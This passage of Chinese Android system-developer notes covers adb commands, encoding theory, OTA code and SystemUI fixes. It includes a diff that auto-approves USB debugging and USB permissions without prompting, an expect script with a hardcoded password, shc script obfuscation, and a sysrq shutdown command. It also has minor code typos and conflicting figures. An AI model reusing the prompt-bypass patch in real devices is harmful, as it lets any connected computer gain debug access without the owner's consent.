        mBatterySaverStateMachine.setBatteryStatus(mIsPowered, mBatteryLevel, mBatteryLevelLow);
    }
}
```

## [CMD] 转屏

```text
先禁掉系统的自动转屏adb shell content insert --uri content://settings/system --bind name:s:accelerometer_rotation --bind value:i:0

adb shell content insert --uri content://settings/system --bind name:s:user_rotation --bind value:i:0  //0度
adb shell content insert --uri content://settings/system --bind name:s:user_rotation --bind value:i:1  //90度
adb shell content insert --uri content://settings/system --bind name:s:user_rotation --bind value:i:2   //180度
adb shell content insert --uri content://settings/system --bind name:s:user_rotation --bind value:i:3  //270度
```

## [CMD] 关机

```text
framework关机接口
adb shell echo "o" > /proc/sysrq-trigger
adb shell reboot -p(某些平台不一样能用)
关机广播(需要system签名)
扣电池

https://blog.csdn.net/mike8825/article/details/105617455
```

## 手机改平板模式

```text
加上 PRODUCT_CHARACTERISTICS := tablet
```

## [CMD] mgrep

```text
在源码根目录source build/envsetup.sh并lunch后，mgrep ESwenjianliulanqi_325就能快速找到相应的mk文件了
```

## [工具] Linux驱动开发常用内存调试工具 memtool and devmem

```text
在驱动调试时,需要直接查看cpu寄存器的值，这里提供提供两种工具，memtool和devmem.

其中devmem在busybox中已包含，直接使用busybox devmem+命令即可。可参考

http://blog.csdn.net/xy010902100449/article/details/47028497

Android源码默认是包含memtool工具的，如果完整编译过Android源码，可通过locate memtool查找该可执行程序。

或者直接下载源码https://github.com/dursunturan/memtool/blob/master/memtool.c，使用交叉工具链进行编译，就可使用。
```

## [sprd]  [sms] Android之展锐平台西班牙特殊字符ú不能发送的问题

```text
franeworks/base/telephony/java/com/android/internal/telephony/GsmAlphabet.java
private static final String[]  sUCS2Tables = {
    "\u00E0\u00E1\u00E2\u00E3\u00E4\u00E5\u00E6\u0101\u01CE",
    "\u00E7",
    "\u00E8\u00E9\u00EA\u00EB\u0113\u011B",
    "\u00EC\u00ED\u00EE\u00EF\u012B\u01D0",
    "\u00F1\u0144\u0148",
    "\u00F2\u00F3\u00F4\u00F5\u00F6\u014D\u01D2",
    "\u0161",
    //"\u00F9u00FA\u00FB\u00FC\u016B\u01D4\u01D6\u01D8\u01DA\u01DC", 修改前
    "\u00F9\u00FA\u00FB\u00FC\u016B\u01D4\u01D6\u01D8\u01DA\u01DC", // 修改后
    "\u00FD\u00FF",
    "\u00C0\u00C1\u00C2\u00C3\u00C4\u00C5\u00C6",
    "\u00C7",
    "\u00C8\u00C9\u00CA\u00CB",
    "\u00CC\u00CD\u00CE\u00CF",
    "\u00D1",
    "\u00D2\u00D3\u00D4\u00D5\u00D6",
    "0x0160",
    "\u00D9\u00DA\u00DB\u00DC",
    "\u00DD\u0178",
};
```

## adb 修改设备的 serial 号码

```text
这个序列号就是adb devices，后返回的一串符号
我的思路是，这个serial号码是android设备都有的，还可以改变，代码也可以读取到，应该就是存储在系统的某个文件里面。最后让我找到了这个文件路径
/sys/class/android_usb/android0/iSerial
修改序列号，也很简单，见下面的代码

root@Android:/sys/class/android_usb/android0 # cat iSerial
19761202
root@android:/sys/class/android_usb/android0 # 
root@android:/sys/class/android_usb/android0 # echo 19761203 > iSerial
root@android:/sys/class/android_usb/android0 # cat iSerial                     
19761203
root@android:/sys/class/android_usb/android0 #
如果adb devices查看设备发现的序列号没有改变，这个应该和adb的主机端服务有关。。。先kill掉服务，再查看设备。
```

## [知识点] 字符编码简介：ASCII，Unicode，UTF-8，GB2312及Unicode和UTF-8如何转化

```text
1、 ASCII码
我们知道，在计算机内部，所有的信息最终都表示为一个二进制的字符串。每一个二进制位（bit）有0和1两种状态，因此八个二进制位就可以组合出256种状态，这被称为一个字节（byte）。也就是说，一个字节一共可以用来表示256种不同的状态，每一个状态对应一个符号，就是256个符号，从0000000到11111111。

上个世纪60年代，美国制定了一套字符编码，对英语字符与二进制位之间的关系，做了统一规定。这被称为ASCII码，一直沿用至今。

ASCII码一共规定了128个字符的编码，比如空格“SPACE”是32（二进制00100000），大写的字母A是65（二进制01000001）。这128个符号（包括32个不能打印出来的控制符号），只占用了一个字节的后面7位，最前面的1位统一规定为0。

2、 非ASCII编码
英语用128个符号编码就够了，但是用来表示其他语言，128个符号是不够的。比如，在法语中，字母上方有注音符号，它就无法用ASCII码表示。于是，一些欧洲国家就决定，利用字节中闲置的最高位编入新的符号。比如，法语中的é的编码为130（二进制10000010）。这样一来，这些欧洲国家使用的编码体系，可以表示最多256个符号。

但是，这里又出现了新的问题。不同的国家有不同的字母，因此，哪怕它们都使用256个符号的编码方式，代表的字母却不一样。比如，130在法语编码中代表了é，在希伯来语编码中却代表了字母Gimel (ג)，在俄语编码中又会代表另一个符号。但是不管怎样，所有这些编码方式中，0—127表示的符号是一样的，不一样的只是128—255的这一段。

至于亚洲国家的文字，使用的符号就更多了，汉字就多达10万左右。一个字节只能表示256种符号，肯定是不够的，就必须使用多个字节表达一个符号。比如，简体中文常见的编码方式是GB2312，使用两个字节表示一个汉字，所以理论上最多可以表示256x256=65536个符号。

中文编码的问题需要专文讨论，这篇笔记不涉及。这里只指出，虽然都是用多个字节表示一个符号，但是GB类的汉字编码与后文的Unicode和UTF-8是毫无关系的。

3、Unicode
Unicode字符集（简称为UCS）,国际标准组织于1984年4月成立ISO/IEC JTC1/SC2/WG2工作组，针对各国文字、符号进行统一性编码。1991年美国跨国公司成立Unicode Consortium，并于1991年10月与WG2达成协议，采用同一编码字集。目前Unicode是采用16位编码体系，其字符集内容与ISO10646的BMP（Basic Multilingual Plane）相同。

Unicode于1992年6月通过DIS（Draf International Standard），目前版本V2.0于1996公布，内容包含符号6811个，汉字20902个，韩文拼音11172个，造字区6400个，保留20249个，共计65534个。

Unicode编码后的大小是一样的.例如一个英文字母 “a” 和　一个汉字 “好”，编码后都是占用的空间大小是一样的，都是两个字节！

Unicode可以用来表示所有语言的字符，而且是定长双字节（也有四字节的）编码，包括英文字母在内。所以可以说它是不兼容iso8859-1编码的，也不兼容任何编码。不过，相对于iso8859-1编码来说，unicode编码只是在前面增加了一个0字节，比如字母’a’为”00 61”。

需要说明的是，定长编码便于计算机处理（注意GB2312/GBK不是定长编码），而unicode又可以用来表示所有字符，所以在很多软件内部是使用unicode编码来处理的，比如java。

Unicode当然是一个很大的集合，现在的规模可以容纳100多万个符号。每个符号的编码都不一样，比如，U+0639表示阿拉伯字母Ain，U+0041表示英语的大写字母A，U+4E25表示汉字“严”。具体的符号对应表，可以查询http://www.unicode.org/，或者专门的汉字对应表。 http://www.chi2ko.com/tool/CJK.htm

4. Unicode的问题
需要注意的是，Unicode只是一个符号集，它只规定了符号的二进制代码，却没有规定这个二进制代码应该如何存储。

比如，汉字“严”的unicode是十六进制数4E25，转换成二进制数足足有15位（100111000100101），也就是说这个符号的表示至少需要2个字节。表示其他更大的符号，可能需要3个字节或者4个字节，甚至更多。

这里就有两个严重的问题，

第一个问题是，如何才能区别unicode和ascii？计算机怎么知道两个字节表示一个符号，而不是一个字节表示一个符号呢？

第二个问题是，我们已经知道，英文字母只用一个字节表示就够了，如果unicode统一规定，每个符号用三个或四个字节表示，那么每个英文字母前都必然有二到三个字节是0，这对于存储来说是极大的浪费，文本文件的大小会因此大出二三倍，这是无法接受的。

它们造成的结果是：1）出现了unicode的多种存储方式，也就是说有许多种不同的二进制格式，可以用来表示unicode。2）unicode在很长一段时间内无法推广，直到互联网的出现。

5.UTF-8
互联网的普及，强烈要求出现一种统一的编码方式。UTF-8就是在互联网上使用最广的一种unicode的实现方式。其他实现方式还包括UTF-16和UTF-32，不过在互联网上基本不用。UTF-8是Unicode的实现方式之一。

UTF-8最大的一个特点，就是它是一种变长的编码方式。它可以使用1~4个字节表示一个符号，根据不同的符号而变化字节长度。

UTF-8的编码规则很简单，只有二条：

对于单字节的符号，字节的第一位设为0，后面7位为这个符号的unicode码。因此对于英语字母，UTF-8编码和ASCII码是相同的。（标准ASCII 码也叫基础ASCII码，使用7 位二进制数来表示所有的大写和小写字母，数字0 到9、标点符号， 以及在美式英语中使用的特殊控制字符。）

对于n字节的符号（n>1），第一个字节的前n位都设为1，第n+1位设为0，后面字节的前两位一律设为10。剩下的没有提及的二进制位，全部为这个符号的unicode码。

Unicode与UTF-8编码规则，字母x表示可用编码的位。
Unicode符号范围 | UTF-8编码方式
(十六进制) | （二进制）
—————————–+———————————————
0000 0000-0000 007F | 0xxxxxxx
0000 0080-0000 07FF | 110xxxxx 10xxxxxx
0000 0800-0000 FFFF | 1110xxxx 10xxxxxx 10xxxxxx
0001 0000-001F FFFF | 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx

对应关系的转化步骤是：
1. 先确定Unicode编码的开始
2. 确定UTF-8使用几个字节，
3. 确定Unicode编码的结束

分析
0000 0000-0000 007F（十六进制） | 0xxxxxxx（二进制）的对应关系：

先确定Unicode的开始位置为0000 0000，
Unicode从0开始的，所以UTF-8先从一个字节开始
根据UTF-8的规则，单字节的符号，字节的第一位设为0，则剩余7位二进制，最大值是1111111，十六进制表示为：7F。
0000 0080-0000 07FF （十六进制）| 110xxxxx 10xxxxxx （二进制）的对应关系：
1. Unicode编码从0000 0080开始的，
2. 因为UTF-8一个字节只能表示到0000 007F，所以从0000 0080开始的UTF-8必须使用两个字节来表示
3. 根据UTF-8的规则，对于n字节的符号（n>1），第一个字节的前n位都设为1，第n+1位设为0，后面字节的前两位一律设为10。所以两个字节的UTF-8，必须是这样的110xxxxx 10xxxxxx，xxxxx xxxxxx是它所能容纳信息的位置，11个二进制最大值为, 111 1111 1111，用16进制表示为7FF。所以两个字节的UTF-8能表示Unicode编码0000 0080-0000 07FF。

以汉字“严”为例，演示如何实现UTF-8编码。

已知“严”的unicode是4E25（100111000100101），根据上表，可以发现4E25处在第三行的范围内（0000 0800-0000 FFFF），因此“严”的UTF-8编码需要三个字节，即格式是“1110xxxx 10xxxxxx 10xxxxxx”。然后，从“严”的最后一个二进制位开始，依次从后向前填入格式中的x，多出的位补0。这样就得到了，“严”的UTF-8编码是“11100100 10111000 10100101”，转换成十六进制就是E4B8A5。

6. Unicode与UTF-8之间的转换
通过上一节的例子，可以看到“严”的Unicode码是4E25，UTF-8编码是E4B8A5，两者是不一样的。它们之间的转换可以通过程序实现。

在Windows平台下，有一个最简单的转化方法，就是使用内置的记事本小程序Notepad.exe。打开文件后，点击“文件”菜单中的“另存为”命令，会跳出一个对话框，在最底部有一个“编码”的下拉条。

里面有四个选项：ANSI，Unicode，Unicode big endian 和 UTF-8。

1）ANSI是默认的编码方式。对于英文文件是ASCII编码，对于简体中文文件是GB2312编码（只针对Windows简体中文版，如果是繁体中文版会采用Big5码）。
2）Unicode编码指的是UCS-2编码方式，即直接用两个字节存入字符的Unicode码。这个选项用的little endian格式。
3）Unicode big endian编码与上一个选项相对应。我在下一节会解释little endian和big endian的涵义。
4）UTF-8编码，也就是上一节谈到的编码方法。

选择完”编码方式“后，点击”保存“按钮，文件的编码方式就立刻转换好了。

7. Little endian和Big endian
上一节已经提到，Unicode码可以采用UCS-2格式直接存储。以汉字”严“为例，Unicode码是4E25，需要用两个字节存储，一个字节是4E，另一个字节是25。存储的时候，4E在前，25在后，就是Big endian方式；25在前，4E在后，就是Little endian方式。

这两个古怪的名称来自英国作家斯威夫特的《格列佛游记》。在该书中，小人国里爆发了内战，战争起因是人们争论，吃鸡蛋时究竟是从大头(Big-Endian)敲开还是从小头(Little-Endian)敲开。为了这件事情，前后爆发了六次战争，一个皇帝送了命，另一个皇帝丢了王位。

因此，第一个字节在前，就是”大头方式“（Big endian），第二个字节在前就是”小头方式“（Little endian）。

那么很自然的，就会出现一个问题：计算机怎么知道某一个文件到底采用哪一种方式编码？

Unicode规范中定义，每一个文件的最前面分别加入一个表示编码顺序的字符，这个字符的名字叫做”零宽度非换行空格“（ZERO WIDTH NO-BREAK SPACE），用FEFF表示。这正好是两个字节，而且FF比FE大1。

如果一个文本文件的头两个字节是FE FF，就表示该文件采用大头方式；如果头两个字节是FF FE，就表示该文件采用小头方式。

8. 实例
打开”记事本“程序Notepad.exe，新建一个文本文件，内容就是一个”严“字，依次采用ANSI，Unicode，Unicode big endian 和 UTF-8编码方式保存。

然后，用文本编辑软件UltraEdit中的”十六进制功能“，观察该文件的内部编码方式。

1）ANSI：文件的编码就是两个字节“D1 CF”，这正是“严”的GB2312编码，这也暗示GB2312是采用大头方式存储的。
2）Unicode：编码是四个字节“FF FE 25 4E”，其中“FF FE”表明是小头方式存储，真正的编码是4E25。
3）Unicode big endian：编码是四个字节“FE FF 4E 25”，其中“FE FF”表明是大头方式存储。
4）UTF-8：编码是六个字节“EF BB BF E4 B8 A5”，前三个字节“EF BB BF”表示这是UTF-8编码，后三个“E4B8A5”就是“严”的具体编码，它的存储顺序与编码顺序是一致的。

9 国标
9.1 GB码
全称是GB2312-80《信息交换用汉字编码字符集基本集》，1980年发布，是中文信息处理的国家标准，在大陆及海外使用简体中文的地区（如新加坡等）是强制使用的唯一中文编码。P-Windows3.2和苹果OS就是以GB2312为基本汉字编码， Windows 95/98则以GBK为基本汉字编码、但兼容支持GB2312。
双字节编码
范围：A1A1~FEFE
A1-A9：符号区，包含682个符号
B0-F7：汉字区，包含6763个汉字

9.2 GB2312
GB2312(1980年)一共收录了7445个字符，包括6763个汉字和682个其它符号。汉字区的内码范围高字节从B0-F7，低字节从 A1-FE，占用的码位是72*94=6768。其中有5个空位是D7FA-D7FE。GB2312-80中共收录了7545个字符，用两个字节编码一个字符。每个字符最高位为0。GB2312-80编码简称国标码。

　　GB2312支持的汉字太少。1995年的汉字扩展规范GBK1.0收录了21886个符号，它分为汉字区和图形符号区。汉字区包括21003个字符。

9.3 GB12345-90
1990年制定了繁体字的编码标准GB12345-90《信息交换用汉字编码字符集第一辅助集》，目的在于规范必须使用繁体字的各种场合，以及古籍整理等。该标准共收录6866个汉字（比GB2312多103个字，其它厂商的字库大多不包括这些字），纯繁体的字大概有2200余个。
双字节编码
范围：A1A1~FEFE
A1-A9：符号区，增加竖排符号
B0-F9：汉字区，包含6866个汉字

9.4 GBK
GBK编码(Chinese Internal Code Specification)是中国大陆制订的、等同于UCS的新的中文编码扩展国家标准。gbk编码能够用来同时表示繁体字和简体字，而gb2312只能表示简体字，gbk是兼容gb2312编码的。GBK工作小组于1995年10月，同年12月完成GBK规范。该编码标准兼容GB2312，共收录汉字21003个、符号883个，并提供1894个造字码位，简、繁体字融于一库。Windows95/98简体中文版的字库表层编码就采用的是GBK，通过GBK与UCS之间一一对应的码表与底层字库联系。

英文名：Chinese Internal Code Specification
中文名：汉字内码扩展规范1.0版
双字节编码，GB2312-80的扩充，在码位上和GB2312-80兼容
范围：8140~FEFE（剔除xx7F）共23940个码位
包含21003个汉字，包含了ISO/IEC 10646-1中的全部中日韩汉字

https://blog.csdn.net/xx326664162/article/details/51453797
```

## [ota] 使用代码进行ota升级

```text
otaPackageFile : ota文件包，不要放在data分区、system分区，一般放在cache分区。
public void installOtaPackageAuto(Context context, File otaPackageFile) {
    Log.e(TAG, "----otaPackageFile  -" + otaPackageFile.exists());
    if (otaPackageFile.exists()) {
        try {
            Log.e(TAG, "----verifyPackage--");
            progressListenr.onProcessStart(1);
            RecoverySystem.verifyPackage(otaPackageFile, this, null);
            progressListenr.onProcessSuccess(1);
            Log.eTAG, "----installPackage--");
            runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    progressDialog1show();
                }
            });
            RecoverySystem.installPackage(context, otaPackageFile);
        } catch (GeneralSecurityException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}

需要的权限
android:sharedUserId="android.uid.system"

<uses-permission android:name="android.permission.RECOVERY" />
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.REBOOT"/>
<uses-permission android:name="android.permission.DELETE_CACHE_FILES"/>
<uses-permission android:name="android.permission.ACCESS_CACHE_FILESYSTEM"/>
```

## [知识点] Hboot

```text
检测SD卡，当你把一些特殊制作的SD卡插入后，SPL可以在启动时校验并根据SD卡内容刷机或执行一些命令。
这有点类似于PC 的从软驱启动。简单点说，SPL就相当于PC的BIOS。
SPL英文全称是Second Program Loader,“第二次装系统”，就是负责装载操作系统到RAM中。
```

## [工具] 详解Android功耗分析工具Power Tutor的使用

```text
https://blog.csdn.net/huangyabin001/article/details/39989037
```

## [CMD] find + grep

```text
find . -type f -exec  grep -Hn --color=auto "Android.mk" {} \;
```

## [CMD] shell脚本自动输入密码方法以及脚本加密方法

```text
1,使用expect实现shell自动交互,push源代码到服务器

脚本名:cp_code_2_server
#!/bin/bash
/usr/bin/expect  <<-EOF
spawn scp -r opensrc/lib opensrc/build opensrc/src build_user@192.168.3.154:/mnt/build_user/AOSP/TZ.XF.5.0.3/trustzone_images/ssg/securemsm/trustzone/qsapps/opensrc
expect {
"*password:" {send "123456\r"}
"*"{send "\r"}
}
expect eof
EOF
echo -e "push success!!!"

2,使用shc对shell脚本加密
安装shc
wget http://www.datsi.fi.upm.es/~frosal/sources/shc-3.8.9.tgz

tar -zvxf shc-3.8.9.tgz
cd shc-3.8.9/
sudo mkdir -p /usr/local/man/man1/
sudo make install
加密cp_code_2_server
shc -r -T -f cp_code_2_server
cp_code_2_server.x 加密后的可执行文件
cp_code_2_server.x.c可执行文件对应的.c源文件
```

## Android系统下，按键振动较弱，请加强触摸键震动反馈

```text
一、找到hx-customer\sp7731e_fs286_M60_hs_BLOCK_MINI_GO_STF_Mexico_32x4_G4W25_WVGA\config.xml.hx文件
二、找到该文件下

0
30
10
30

把两个30改为40或50
```

## [知识点] 3GPP,3GPP2,WiMAX等的一些关系

```text
3GPP，即3rd Generation Partnership Project。是一个成立于1998年12月的标准化机构。目前其成员包括欧洲的ETSI、日本的ARIB和TTC、中国的CCSA、韩国的TTA和北美的ATIS。 
　　3GPP的目标是在ITU的IMT-2000计划范围内制订和实现全球性的(第三代) 移动电话系统规范。它致力于GSM到UMTS（W-CDMA)的演化，虽然GSM到W-CDMA空中接口差别很大，但是其核心网采用了GPRS的框架，因此仍然保持一定的延续性。 
　　3GPP主要是制订以GSM核心网为基础，UTRA(FDD为W-CDMA技术，TDD为TD-CDMA技术)为无线接口的第三代技术规范。
3GPP2[1] 英文 3rd Generation Partnership Project 2 的缩写形式。
　　3GPP2(第三代合作伙伴计划2): 该组织是于1999年1月成立，由北美TIA、日本的ARIB、日本的TTC、韩国的TTA四个标准化组织发起，主要是制订以ANSI-41核心网为基础，CDMA2000为无线接口的第三代技术规范。
　　
3GPP和3GPP2两者实际上存在一定竞争关系，有看法认为3GPP组织的存在很大程度上是为了避开高通公司在CDMA标准方面的专利。3GPP2致力 于以IS-95(在北美和韩国应用广泛的CDMA标准，中国电信CDMA与之兼容)向3G过渡，和高通公司关系更加紧密。 
　　中国无线通信标准研究组(CWTS)于1999年6月在韩国正式签字同时加入3GPP和3GPP2, 成为这两个当前主要负责第三代伙伴项目的组织伙伴。在此之前，我国是以观察员的身份参与这两个伙伴的标准化活动。
WiMax(Worldwide Interoperability for Microwave Access),即全球微波互联接入。WiMAX的另一个名字是802.16。WiMAX是一项新兴的宽带无线接入技术，能提供面向互联网的高速连接，数 据传输距离最远可达50km。WiMAX还具有QoS保障、传输速率高、业务丰富多样等优点。WiMAX的技术起点较高，采用了代表未来通信技术发展方向 的OFDM/OFDMA、AAS、MIMO等先进技术，随着技术标准的发展，WiMAX逐步实现宽带业务的移动化，而3G则实现移动业务的宽带化，两种网 络的融合程度会越来越高。 
HSUPA (high speed uplink packet access)高速上行链路分组接入。HSUPA通过采用多码传输、HARQ、基于Node B的快速调度等关键技术，使得单小区最大上行数据吞吐率达到5.76Mbit/s，大大增强了WCDMA上行链路的数据业务承载能力和频谱利用率。
HSDPA（High Speed Downlink Packet Access)高速下行分组接入,是一种移动通信协议，亦称为3.5G(3&frac12;G)。该协议在WCDMA下行链路中提供分组数据业 务，在一个5MHz载波上的传输速率可达8-10 Mbit/s（如采用MIMO技术，则可达20 Mbit/s）。在具体实现中，采用了自适应调制和编码（AMC）、多输入多输出（MIMO）、混合自动重传请求（HARQ）、快速调度、快速小区选择等 技术。 
TD-SCDMA是英文Time Division-Synchronous Code Division Multiple Access（时分同步码分多址） 的简称，是一种第三代无线通信的技术标准，也是ITU批准的三个3G标准中的一个，相对于另两个主要3G标准（CDMA2000）或（WCDMA）它的起 步较晚。 
WCDMA 是英文Wideband Code Division Multiple Access（宽带码分多址）的英文简称，是一种第三代无线通讯技术。W-CDMAWideband CDMA 是一种由3GPP具体制定的，基于GSM MAP核心网，UTRAN（UMTS陆地无线接入网）为无线接口的第三代移动通信系统。目前WCDMA有Release 99、Release 4、Release 5、Release 6等版本。目前中国联通采用的此种3G通讯标准。

CDMA2000（Code Division Multiple Access 2000） 是一个3G移动通讯标准，国际电信联盟ITU的IMT-2000标准认可的无线电接口，也是2G cdmaOne标准的延伸。 根本的信令标准是IS-2000。 CDMA2000与另一个3G标准WCDMA不兼容。

LTE(Long Term Evolution,长期演进)项目是3G的演进，始于2004年3GPP的多伦多会议。LTE并非人们普遍误解的4G技术，而是3G与4G技术之间的一 个过渡，是3.9G的全球标准,它改进并增强了3G的空中接入技术，采用OFDM和MIMO作为其无线网络演进的唯一标准。在20MHz频谱带宽下能够提 供下行326Mbit/s与上行86Mbit/s的峰值速率。改善了小区边缘用户的性能，提高小区容量和降低系统延迟。 
UMB是CDMA2000系列标准的演进升级版本，可升级至20MHz的带宽，可在现有或新分配的频段中部署。UMB能够带来更大的带宽、频段和波段选择 范围，以及网络的可升级性和灵活性。UMB系统是以OFDMA(正交频分复用接入)技术为基础、专门针对无线移动环境和实时应用优化的移动无线宽带系统， 它继承了DO系统的自适应编码调制、HARQ(物理层混合重传)以及QoS控制机制，结合了CDMA、TDM、QOFDMA(准OFDMA)、 LDPC(低密度奇偶校验码)等其它先进技术，同时引入了基于MIMO(多路输入输出)、SDMA(空分复用接入)和Beamforming(波束赋性) 等多天线技术，使系统可以在达到更高传输效率的同时经济有效地支持各类具有QoS要求的应用。
```

## 寻找某个包在aosp下的路径

```text
1.找到包名
adb shell ps | grep "xxx"
或
adb shell dumpsys window | grep "mCurrentFocus"
或
adb shell pm list package xxx

2.根据包名找到在手机上的安装路径
adb shell pm path "aa.bb.cc"
结果会显示 /product/app/xxxx/xxxx.apk

3.根据路径中的apk名称找到aosp下的路径
source build/envsetup.sh
lunch
pathmod xxxx

结果会显示
/home/aaa/Projects/Project_common/alps/vendor/sprd/platform/packages/apps/xxxx
```

## yyyy-MM-dd 和 YYYY-MM-dd 时间区别？

```text
y: year of era->正正经经的年；（正确）
Y: week based year->只要本周跨年，那么这周就算进入下一年了，也就是12月；（错误）
```

## 去掉usb授权提示框默认给予权限

```text
diff --git a/frameworks/base/packages/SystemUI/src/com/android/systemui/usb/UsbDebuggingActivity.java b/frameworks/base/packages/SystemUI/src/com/android/systemui/usb/UsbDebuggingActivity.java
index 66d5ee1..05cc9a2 100644
--- a/frameworks/base/packages/SystemUI/src/com/android/systemui/usb/UsbDebuggingActivity.java
+++ b/frameworks/base/packages/SystemUI/src/com/android/systemui/usb/UsbDebuggingActivity.java
@@ -126,10 +126,20 @@ public class UsbDebuggingActivity extends AlertActivity
             if (!UsbManager.ACTION_USB_STATE.equals(action)) {
                 return;
             }
-            boolean connected = intent.getBooleanExtra(UsbManager.USB_CONNECTED, false);
+            //boolean connected = intent.getBooleanExtra(UsbManager.USB_CONNECTED, false);
+            boolean connected = false;

+
+   try {
+     IBinder b = ServiceManager.getService(USB_SERVICE); 
+     IUsbManager service = IUsbManager.Stub.asInterface(b);
+     service.allowUsbDebugging(true, mKey);
+     } catch (Exception e) {
+      Log.e(TAG, "Unable to notify Usb service", e); 
+     }
+  
         }
     }
 
diff --git a/frameworks/base/packages/SystemUI/src/com/android/systemui/usb/UsbPermissionActivity.java b/frameworks/base/packages/SystemUI/src/com/android/systemui/usb/UsbPermissionActivity.java
index 238407a..afeddd4 100644
--- a/frameworks/base/packages/SystemUI/src/com/android/systemui/usb/UsbPermissionActivity.java
+++ b/frameworks/base/packages/SystemUI/src/com/android/systemui/usb/UsbPermissionActivity.java
@@ -134,6 +134,9 @@ public class UsbPermissionActivity extends AlertActivity
         }
 
         setupAlert();
+  Log.d(TAG, "grant usb permission automatically");
+  mPermissionGranted = true;
+     finish();
 
     }
```

## [CMD] 设置自定义脚本为全局使用

```text
1、创建一个存放命令的目录
cd && mkdir -p cmd

2、编写一个脚本文件用来响应命令
cd ~/cmd
vim vlog
#!/bin/bash

# 判断参数是否非空
if [ -z "$1" ] 
then
  echo 'Error Param , value 1 - 2'
  exit 1
fi

if [ $1 == 1 ] 
then
 echo "我是1 "
elif [ $1 == 2 ] 
then
 echo "我是2 "
fi

# 注册命令

# chmod +x ~/cmd/vlog.sh
# export PATH=~/cmd:$PATH

3、注册命令
给脚本增加可执行权限
把脚本目录注册到系统变量

chmod +x ~/cmd/vlog
export PATH=~/cmd:$PATH
4、执行脚本
vlog 1
5 export 生命周期
export 在当前会话生效，断开则失效

所以，我们把 export 注册到 bashrc 文件中

cat >> ~/.bashrc <<"EOF"
export PATH=~/cmd:$PATH
EOF
查看文件

cat ~/.bashrc
```

## 隐藏 DecorView 上的 navigationBarBackground

```text
getWindow().addFlags(View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION);
```

## [sysui] Android Q第一次打开settings下的hotspot/data saver等开关的时候会在下拉状态栏上自动添加一个Tile

```text
操作步骤：
1.设置---network&internet---data saver，开启data saver
2.设置---network&internet---wifi热点，开启热点

实际结果：
下拉状态栏本来只有一页，开启后第2页会多出图标。重置下拉状态栏，再次开启关闭 data saver/wifi 热点，第2页中不会多出图标

修改方法：
研究代码之后发现 SystemUI 里面本身就有这个机制 AutoAddTracker，第一次打开一些开关的时候会把已经添加过的 Tile 放到 Secure.QS_AUTO_ADDED_TILES 数据库中，并添加一个 Tile 到下拉状态栏中。
添加 Tile 的方法在 AutoTileManager.java 中
以 DataSaver 为例
frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/phone/AutoTileManager.java
private final DataSaverController.Listener mDataSaverListener = new Listener() {
    @Override
    public void onDataSaverChanged(boolean isDataSaving) {
        if (mAutoTracker.isAdded(SAVER)) return;
        if (isDataSaving) {
            mHost.addTile(SAVER);
            mAutoTracker.setTileAdded(SAVER);
            mHandler.post(() -> mDataSaverController.removeCallback(mDataSaverListener));
        }
    }
};

frameworks/base/packages/SystemUI/src/com/android/systemui/qs/AutoAddTracker.java
public boolean isAdded(String tile) {
    return mAutoAdded.contains(tile);
}

mAutoAdded 添加的地方一，这个方法会在 AutoTileManager 中监听到 onDataSaverChanged 的时候调用
public void setTileAdded(String tile) {
    if (mAutoAdded.add(tile)) {
        saveTiles();
    }
}

mAutoAdded 添加的地方二：监听 Secure.QS_AUTO_ADDED_TILES 数据库的变化
mContext.getContentResolver().registerContentObserver(Secure.getUriFor(Secure.QS_AUTO_ADDED_TILES), false, mObserver);
@VisibleForTesting
protected final ContentObserver mObserver = new ContentObserver(new Handler()) {
    @Override
    public void onChange(boolean selfChange) {
        mAutoAdded.addAll(getAdded());
    }
};

最终是从 Secure.QS_AUTO_ADDED_TILES 数据库中取出所有添加过的 Tile
private Collection<String> getAdded() {
    String current = Secure.getString(mContext.getContentResolver(), Secure.QS_AUTO_ADDED_TILES);
    if (current == null) {
        return Collections.emptyList();
    }
    return Arrays.asList(current.split(","));
}

修改方法就是让系统认为我们已经添加过这几个Tile了，有两种修改方法
1.在 DatabaseHelper.java 中加载 Secure.QS_AUTO_ADDED_TILES 的默认值
frameworks/base/packages/SettingsProvider/src/com/android/providers/settings/DatabaseHelper.java
private void loadSecureSettings(SQLiteDatabase db) {
    SQLiteStatement stmt = null;
    try {
        stmt = db.compileStatement("INSERT OR IGNORE INTO secure(name,value)" + " VALUES(?,?);");
        ......
        loadStringSetting(stmt, Settings.Secure.QS_AUTO_ADDED_TILES, R.string.def_auto_added_tiles);
        ......
    }
}

frameworks/base/packages/SettingsProvider/res/values/defaults.xml
<string name="def_auto_added_tiles" translatable="false">hotspot,saver,inversion,work,night,cast</string>

2.修改 isAdded() 方法始终返回 true
frameworks/base/packages/SystemUI/src/com/android/systemui/qs/AutoAddTracker.java
public boolean isAdded(String tile) {
    // modified begin
    return true || mAutoAdded.contains(tile);
    // modified end
}
```

## [知识点] 蓝牙Bluetooth

```text
Bluetooth这个名字并不带任何技术性，它既不是缩写也不代表任何东西。据悉是来自于一名丹麦国王 (Harald Blåtand)，他有两件举世闻名的事件，一是在958年统一了丹麦和挪威，二是他的坏牙是深蓝/灰色的（也因此有了Bluetooth这个别称）。在1996年的某一天，三大行业领袖因特尔、爱立信和诺基亚开会计划建立支持不同产业和行业之间短距离的无线通信标准，在会议上来自因特尔的Jim Kardash建议使用Bluetooth作为临时代码别称，Jim Kardash说“ Harald Bluetooth国王因统一了各战乱派而闻名，就像我们计划借助短距离无线连接来联合PC和电话行业”。也即因此，沿用了丹麦国王的名字。照这么说来，如果蓝牙是由中国人发明的话那就应该称之为秦始皇，毕竟统一了六国呀，开个玩笑。
但在不久之后，需要为Bluetooth重新赋予一个严肃的名字。当时给出了两个选择一是RadioWire （无线)，二是PAN（个人局域网）。当时优先考虑PAN这个名字，但是调查后发现PAN已经在互联网上出现了成千上万次，所以就给否定了。而RadioWire又因为商标无法及时发布导致被弃用，别无选择，Bluetooth又成了唯一…很庆幸当时否定了pan，跟Bluetooth相比，pan简直是太难听了。
也因此Bluetooth成为了短距离无线通信的代名词。
而蓝牙的图标则取决于符文（Hagall）（ᚼ）和（Bjarkan）（ᛒ），首字母正好是丹麦国王Harald的缩写

0.2
那么蓝牙是什么呢？？
